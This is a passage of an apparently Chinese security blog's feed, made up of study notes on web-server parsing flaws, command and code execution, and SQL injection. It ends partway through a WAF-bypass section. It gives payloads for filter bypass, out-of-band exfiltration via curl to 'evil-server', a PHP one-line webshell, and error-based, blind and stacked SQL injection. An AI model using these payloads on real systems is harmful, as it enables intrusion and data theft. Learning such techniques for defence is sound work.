    <content type="html"><![CDATA[<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>概述：web容器将其他格式的文件解析为可执行脚本语言，攻击者可以利用这个特征去执行一些攻击行为。</p><p>产生条件</p><ul><li><p>命名规则</p></li><li><p>搭建平台</p></li></ul><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="IIS5-x-6-x"><a href="#IIS5-x-6-x" class="headerlink" title="IIS5.x-6.x"></a>IIS5.x-6.x</h3><p>该类服务器大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><ul><li><p>目录解析</p><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><p>服务器默认会把<code>.asp</code>目录下的文件都解析成 asp 文件。</p></li><li><p>文件解析</p><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p><p><strong>服务器默认不解析 <code>;</code> 号后面的内容</strong>，<code>xx.asp;.jpg</code>被解析成asp文件</p></li><li><p>解析文件类型</p><p>IIS 6.0 默认的可执行文件除了asp还包含 :</p><ul><li>/test.asa</li><li>/test.cer</li><li>/test.cdx</li></ul></li></ul><h3 id="IIS6-0-CVE-缓冲区溢出"><a href="#IIS6-0-CVE-缓冲区溢出" class="headerlink" title="IIS6.0 CVE 缓冲区溢出"></a>IIS6.0 CVE 缓冲区溢出</h3><ul><li><p>CVE-2017-7269</p><p>PROPFIND 缓冲区栈溢出漏洞导致远程代码随意执行</p></li></ul><h3 id="IIS7-0-IIS7-5"><a href="#IIS7-0-IIS7-5" class="headerlink" title="IIS7.0-IIS7.5"></a>IIS7.0-IIS7.5</h3><p>畸形漏洞解析漏洞</p><p>在默认Fast-CGI开启状态下，在原路径的jpg文件后加上 <code>/xx.php</code> 内容，即访问路径为  xxx.jpg/.php，会以被解析为php文件</p><p>形式：<a href="http://www.xxx.com/xx.jpg/.php">www.xxx.com/xx.jpg/.php</a></p><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><p>漏洞描述：IIS 服务器开启 WebDAV  且配置了可写入权限。可以直接使用HTTP的 <strong>PUT请求写入任意文件</strong></p><h3 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h3><p>漏洞描述：Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名。</p><p>使用 <code>xx.php[空格]</code> ， <code>xx.php.</code>， <code>xx.php/</code>， <code>xx.php::$DATA</code> 上传脚本文件。</p><h3 id="短文件名猜解漏洞"><a href="#短文件名猜解漏洞" class="headerlink" title="短文件名猜解漏洞"></a>短文件名猜解漏洞</h3><p>漏洞描述：为了兼容16位MS-DOS程序，Windows为文件名较长（length&gt;9）的文件和文件夹生成了对应的DOS 8.3 短文件名。</p><p><strong>短文件名命名格式</strong></p><ul><li>全部大写</li><li>显示6位</li><li>超过6位用~1表示</li><li>不显示特殊字符</li><li>后缀最多显示三位，其余的被截断</li></ul><p>验证手法：在地址栏中插入一个存在通配符* 和?的请求（<code>url/a*~1*</code>），当IIS接收到一个文件路径中包含~的请求时，根据文件是否存在，得到的返回值是不同的，文件存在返回404，文件不存在返回400</p><p>工具：IIS_shortname_Scanner</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h4 id="Apache-1-x-2-x"><a href="#Apache-1-x-2-x" class="headerlink" title="Apache 1.x~2.x"></a>Apache 1.x~2.x</h4><ul><li><strong>后缀解析</strong></li></ul><p>形式：<a href="http://www.xxxx.xxx.com/test.php.php123.qwd.wad">www.xxxx.xxx.com/test.php.php123.qwd.wad</a></p><p>该版本解析文件的原则：在解析文件名的时候是<strong>从右向左</strong>依次识别，用于<strong>绕过基于黑名单的检查</strong></p><h4 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h4><p>漏洞描述：配置文件 http.conf 配置Options问题</p><p>Options 设置了+Indexes Apache存在目录遍历</p><h4 id="CVE-0A绕过"><a href="#CVE-0A绕过" class="headerlink" title="CVE %0A绕过"></a>CVE %0A绕过</h4><p>漏洞描述：上传文件名后加%0A，可以直接解析</p><p> Apache配置使用了&lt;FileMatch&gt;:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;  </span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h4 id="lighttped组件"><a href="#lighttped组件" class="headerlink" title="lighttped组件"></a>lighttped组件</h4><p>xxx.jpg/xx.php</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h4 id="Nginx-lt-8-037"><a href="#Nginx-lt-8-037" class="headerlink" title="Nginx&lt;8.037"></a>Nginx&lt;8.037</h4><p>在默认Fast-CGI开启状态下，访问路径为  xxx.jpg/.php，jpg文件会以php形式解析</p><p>形式：<a href="http://www.xxx.com/xx.jpg/.php">www.xxx.com/xx.jpg/.php</a></p><p>空字节漏洞</p><p>影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;= 0.8.37</p><h4 id="Fast-CGI关闭"><a href="#Fast-CGI关闭" class="headerlink" title="Fast-CGI关闭"></a>Fast-CGI关闭</h4><p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 <code>%00.php</code> ， 即 <code>xx.jpg%00.php</code> 会被当做 php 文件来解析</p><h4 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure><h4 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h4><h5 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h5><p>如果配置中存在类似 <code>location /foo &#123; alias /bar/; &#125;</code> 的配置时，<code>/foo../</code> 会被解析为 <code>/bar/../</code> 从而导致目录穿越的发生。</p><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>配置中 <code>autoindex on</code> 开启时，Nginx中存在目录遍历漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中间件&quot;&gt;&lt;a href=&quot;#中间件&quot; class=&quot;headerlink&quot; title=&quot;中间件&quot;&gt;&lt;/a&gt;中间件&lt;/h1&gt;&lt;p&gt;概述：web容器将其他格式的文件解析为可执行脚本语言，攻击者可以利用这个特征去执行一些攻击行为。&lt;/p&gt;
&lt;p&gt;产生条件&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Red" scheme="http://example.com/categories/Red/"/>
    
    <category term="常见web漏洞" scheme="http://example.com/categories/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>命令执行代码执行</title>
    <link href="http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-04-30T03:11:45.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>概述：RCE（remote command/code execute）</p><ul><li>分为<strong>远程命令执行</strong>和<strong>远程代码执行</strong></li></ul><p><strong>区别</strong></p><ul><li><p>命令执行：调用操作系统命令进行执行</p></li><li><p>代码执行：调用服务器网站代码进行执行</p></li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul><li>system</li><li>exec</li><li>passthru</li><li>shell_exec</li><li>popen</li><li>proc_open</li></ul><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><ul><li>system</li><li>popen</li><li>subprocess.call</li><li>spawn</li></ul><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><ul><li>java.lang.Runtime.getRuntime().exec(command)</li></ul><h3 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h3><p><strong>通过命令分隔符和系统命令执行</strong></p><ul><li><code>;</code>  <code>&amp;</code>  <code>&amp;&amp;</code> <code>||</code>分割</li><li><code>|</code> 管道符</li><li><code>\r\n</code> <code>%d0%a0</code> 换行</li><li>反单引号解析</li><li><code>$()</code> 替换</li></ul><p><strong>命令分隔符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br><span class="line"></span><br><span class="line">; 连续指令。命令按照顺序（从左到右）被执行，可以用多个分号进行分隔。有命令执行失败时，不会中断其它命令的执行。</span><br><span class="line">&amp; 简单拼接 无制约</span><br><span class="line">&amp;&amp; 前面执行成功后面才会执行</span><br><span class="line">| 符号 左边输出 作为右边输入。当第一条命令失败时，它仍然会执行第二条命令</span><br><span class="line">|| 前面执行失败才会执行后面</span><br><span class="line"></span><br><span class="line">linux下\为转义  windows下^为转义</span><br></pre></td></tr></table></figure><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h4><h4 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h4><h4 id="黑名单关键字过滤"><a href="#黑名单关键字过滤" class="headerlink" title="黑名单关键字过滤"></a>黑名单关键字过滤</h4><p>敏感字符过滤绕过ls、cat、flag等</p><p><strong>1、变量绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;l;b&#x3D;s;$a$b</span><br></pre></td></tr></table></figure><p><strong>2、使用通配符</strong></p><p>通配符？代表一个字符串 *代表任意个字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;tm?&#x2F;fl*  (Linux)</span><br><span class="line">type fla*     (windows)</span><br></pre></td></tr></table></figure><p><strong>3、借用已有字符串</strong></p><p>​    利用substr()函数截取文件中的字符串来代替被过滤字符</p><p><strong>4、编码绕过</strong> base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1;echo 1Y2F0IGZsYWcucGhw|base64 -d|sh</span><br><span class="line">1Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure><p><strong>5、连接符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;pass&#39;w&#39;d</span><br></pre></td></tr></table></figure><p><strong>空格过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</span><br><span class="line">&lt;      cat&lt;xxx.php</span><br><span class="line">$&#123;IFS&#125; cat$&#123;IFS&#125;xxx.php</span><br><span class="line">$IFS$9 cag$$IFS$9xx.php</span><br></pre></td></tr></table></figure><h3 id="技巧性"><a href="#技巧性" class="headerlink" title="技巧性"></a>技巧性</h3><p><strong>内联执行</strong></p><p>  (将反引号内命令的输出作为输入执行)  非常骚的思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat &#96;ls&#96;</span><br></pre></td></tr></table></figure><p><strong>无参数函数RCE</strong></p><p><strong>无回显技巧</strong></p><ul><li>bash反弹shell</li><li>DNS带外数据</li><li>http带外<ul><li><code>curl http://evil-server/$(whoami)``wget</code></li><li><code>http://evil-server/$(whoami)</code></li></ul></li><li>无带外时利用 <code>sleep</code> 或其他逻辑构造布尔条件</li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>不使用时禁用相应函数</li><li>尽量不要执行外部的应用程序或命令</li><li>做输入的格式检查</li><li><strong>转义命令中的所有shell元字符</strong><ul><li>shell元字符包括 <code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</code></li></ul></li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="常见危险函数-1"><a href="#常见危险函数-1" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h4><ul><li>eval</li><li>assert</li><li>preg_replace  <strong>带有/e参数</strong></li><li>call_user_func()/call_user_func_array() <strong>调用函数</strong></li><li>create_function()</li><li>array_map()</li><li>array_filter()</li><li>usort(),uasort()</li></ul><h3 id="常见注入方式-1"><a href="#常见注入方式-1" class="headerlink" title="常见注入方式"></a>常见注入方式</h3><p>一句话木马 getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[a];?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE&quot;&gt;&lt;a href=&quot;#RCE&quot; class=&quot;headerlink&quot; title=&quot;RCE&quot;&gt;&lt;/a&gt;RCE&lt;/h1&gt;&lt;p&gt;概述：RCE（remote command/code execute）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分为&lt;strong&gt;远程命令执行&lt;</summary>
      
    
    
    
    <category term="Red" scheme="http://example.com/categories/Red/"/>
    
    <category term="常见web漏洞" scheme="http://example.com/categories/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>注入</title>
    <link href="http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%B3%A8%E5%85%A5/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-05-25T13:07:04.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>概述：web应用程序对用户<strong>输入数据控制不严格</strong>，导致用户输入数据被<strong>拼接到SQL语句</strong>中被数据库<strong>执行</strong>导致的安全问题。</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p><strong>按注入方式分类</strong></p><ul><li><p>联合注入：需要内容显示位。</p></li><li><p>报错注入：返回error信息。双查询注入、函数报错 <strong>extractvalue()；updatexml()</strong></p></li><li><p>盲注</p><ul><li>布尔注入：返回页面不同。<strong>异或注入^、’ or ‘1’=’1、三元 if 语句</strong></li><li>时间盲注：界面不更新任何内容，sleep()</li></ul></li><li><p>堆叠注入：</p></li></ul><p><strong>按查询类型分类</strong></p><p>数字型注入、字符型注入、搜索型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索型：select * from 表名 where 字段 like &#39;%关键字%&#39;</span><br></pre></td></tr></table></figure><p><strong>按提交方式注入分类</strong></p><p>GET、POST、Cookie、head头</p><p><strong>按sql语句类型分类</strong></p><p>insert（增）、delete（删）、update（改）、select（查）</p><hr><h2 id="注入检测手法"><a href="#注入检测手法" class="headerlink" title="注入检测手法"></a>注入检测手法</h2><p><strong>注入前的准备工作</strong>（注入点-&gt;输入类型-&gt;回显方式-&gt;未被过滤内容 -&gt;构造闭合）</p><p>（1）找到存在注入漏洞的注入点   【搜索栏/登录框/url地址栏/header头】</p><p>（2）判断输入类型   【字符串/数字类型/搜索型】</p><p>（3）判断其回显方式（找到正确的显示位，根据回显来决定应该选用哪种注入类型）</p><p>（4）判断被过滤的内容  【单双引号/sql语句/<strong>‘</strong> <strong>^ # , ; and union 空格</strong>】</p><p>（5）判断SQL闭合方式</p><h3 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h3><p><strong>常见的注入点</strong></p><ul><li>GET/POST/PUT/DELETE参数</li><li>X-Forwarded-For、header头</li><li>文件名</li></ul><p><strong>获取信息</strong></p><ul><li>数据库类型<ul><li><code>and exists (select * from msysobjects ) &gt; 0</code> access数据库</li><li><code>and exists (select * from sysobjects ) &gt; 0</code> SQLServer数据库</li></ul></li><li>版本、主机名、用户名、库名</li><li>表和字段<ul><li>确定字段数<ul><li>Order By</li><li>Select Into</li></ul></li><li>表名、列名</li></ul></li></ul><p><strong>基本查询语句</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">order by n   判断数据库列数</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata  查询数据库</span><br><span class="line">select group_concat(table_name) from information_schema.tables     查询表</span><br><span class="line">select group_concat(column_name) from information_schema.columns   查询字段</span><br><span class="line">select 字段名 from 表名                                通过表和字段获查询记录</span><br><span class="line">条件：</span><br><span class="line">where table_schema&#x3D;&#39;数据库名&#39;</span><br><span class="line">where table_name&#x3D;&#39;表名&#39;</span><br><span class="line"></span><br><span class="line">关键表：</span><br><span class="line">schema 数据库</span><br><span class="line">table 表</span><br><span class="line">colum 字段</span><br><span class="line">information_schema 提供元数据查询的数据库</span><br><span class="line"></span><br><span class="line">1&#39; and extractvalue(0x0a,concat(0x0a,(database())))#   查询数据库</span><br></pre></td></tr></table></figure><p><strong>常用参数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">version()：MySQL版本</span><br><span class="line">user():数据库用户名</span><br><span class="line">database():数据库名</span><br><span class="line">@@datadir:数据库存储路径</span><br><span class="line">@@basedir：mysql安装路径</span><br><span class="line">@@version_compile_os:操作系统版本</span><br></pre></td></tr></table></figure><h3 id="详细注入类型"><a href="#详细注入类型" class="headerlink" title="详细注入类型"></a>详细注入类型</h3><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;</span><br><span class="line">&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">+ - ^ * % &#x2F;</span><br><span class="line">&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>(1)extractvalue()</strong>    对 xml 文档进行查询的函数，类似于 html 用标签查找元素    查询最大length为32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法：extractvalue(XML_document，XPath_string)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法)   </span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，会返回写入的非法格式内容，</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,extractvalue(1,concat(0x7e,(select 语句))) #</span><br><span class="line">0x7e为 ~符号的16进制 用16进制是防止单双引号被过滤问题</span><br><span class="line"></span><br><span class="line">例：and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables limit 1,1)));</span><br><span class="line"></span><br><span class="line">ps：extractvalue()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line"> 或者使用reverse() 逆序函数</span><br></pre></td></tr></table></figure><p><strong>(2)UPDATEXML()</strong>    更新xml文档      查询最大length为32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法：UPDATEXML(XML_document，XPath_string，new_value)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法) 参数3：替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，返回写入的非法格式内容</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,updatexml(1,concat(0x7e,(sql语句)),1) #</span><br><span class="line">例：</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">ps：UPDATEXML()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line">  或者使用reverse() 逆序函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>布尔盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(1)普通布尔盲注：利用ascii(),substr(),二分法查找</span><br><span class="line">id&#x3D;1&#39; and length(database())&#x3D;8 #</span><br><span class="line">id&#x3D;1&#39; ascii(substr(database(),1,1))&gt;65</span><br><span class="line"></span><br><span class="line">(2)三元if语句</span><br><span class="line">id&#x3D;1&#39; or if((select 语句),结果1,结果2) #</span><br><span class="line"></span><br><span class="line">如果查询条件成立执行结果1,不成立执行结果2</span><br><span class="line">if((ascii(substr((select 语句,x,1))&gt;x),1,2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><p>涉及：sleep() 、 if(条件, true, false)、mid(str,1,1) 截取、ord(ascii编码)、length</p><p>基础payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;1 and sleep(if((select databse()&#x3D;&#39;xiaodi&#39;),0,5))</span><br><span class="line"></span><br><span class="line">判断表名长度</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(length(table_name)&#x3D;4,0,5)) from information_schema.tables where table_schema&#x3D;databse() limit 0,1</span><br><span class="line"></span><br><span class="line">判断表名</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(mid(table_name,1,1)&#x3D;&#39;a&#39;,0,5)) from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; or if((select 语句),sleep(2),0)#   如果查询条件成立执行sleep(2),不成立执行0</span><br></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">预处理语句使用方式：</span><br><span class="line">SET @sql &#x3D; variable;  &#x2F;&#x2F;设置变量</span><br><span class="line">PREPARE yuchuli from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句</span><br><span class="line">EXECUTE yucrename table &#96;当前表名&#96; to &#96;改后表名&#96;;   &#x2F;&#x2F;修改表名  </span><br><span class="line">alter table &#96;表名&#96; add(字段名 字段类型 NULL) &#x2F;&#x2F;在表中添加字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模板:</span><br><span class="line">SET @sql &#x3D; 执行语句；   &#x2F;&#x2F;要执行的sql语句</span><br><span class="line">PREPARE 名称 from @sql；    &#x2F;&#x2F;名称随便取开心就好</span><br><span class="line">EXECUTE 名称；</span><br></pre></td></tr></table></figure><p>利用思路：select查询语句在php代码里已经固定，通过执行堆叠注入将数据库的内容修改掉，使前端执行后的代码是查询我们的目标数据</p><h2 id="注入攻击方向"><a href="#注入攻击方向" class="headerlink" title="注入攻击方向"></a>注入攻击方向</h2><h3 id="读取数据库信息"><a href="#读取数据库信息" class="headerlink" title="读取数据库信息"></a>读取数据库信息</h3><p>version()：MySQL版本<br>user():数据库用户名<br>database():数据库名<br>@@datadir:数据库存储路径<br>@@basedir：mysql安装路径<br>@@version_compile_os:操作系统版本</p><p>数据库名、表名、列名、字段名、记录</p><hr><h3 id="高权限文件操作（Getshell）"><a href="#高权限文件操作（Getshell）" class="headerlink" title="高权限文件操作（Getshell）"></a>高权限文件操作（Getshell）</h3><blockquote><p>读取  写入</p></blockquote><p><font color='red'>mysql注入文件操作：文件操作权限（<strong>root用户</strong>）允许情况下，可以直接写入shell</font></p><p><strong>前置要求：</strong></p><ul><li>路径参数必须为绝对路径</li><li>写入的路径文件可解析，写入位置为 www 网站下</li><li>root权限用户</li></ul><p>读取文件函数：load_file(‘filename’)</p><p>写入文件函数： into out file  ‘filename’</p><p>信息获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取数据库用户：user</span><br><span class="line">获取操作系统：@@version_compile_os  (在写入文件时会涉及不同系统的特性 例如windows大小写不敏感)</span><br><span class="line">获取路径：@@DATADIR</span><br></pre></td></tr></table></figure><p><strong>网站获取路径方法：</strong></p><ul><li><p>报错显示</p></li><li><p>google hacker语法</p><p>inurl: php  warning</p></li><li><p>读取搭建平台的配置文件</p><p>IIS6.0配置路径</p><p>Apache 配置路径</p><p>phpstudy 配置路径</p></li><li><p>漏洞报错</p><p>例如：cms爆路径</p></li><li><p>遗留文件</p><p>说明文件 ；例如 inurl:phpinfo.php</p></li><li><p>字典猜解</p></li></ul><h3 id="高权限跨库注入"><a href="#高权限跨库注入" class="headerlink" title="高权限跨库注入"></a>高权限跨库注入</h3><p>跨库注入条件：root权限</p><p>概述：网站A无注入点，网站B存在mysql注入(root权限用户)，A与B的存在于同一个数据库中，利用网站B注入获取网站A信息</p><p>流程：</p><ul><li>获取所有数据库名</li><li>获取目标数据库名</li><li>执行常规操作获取表名和字段名</li><li>获取相关数据时记得在表名前加上指定的数据库名</li></ul><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><strong>过滤关键内容：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">and -&gt; &amp;&amp;</span><br><span 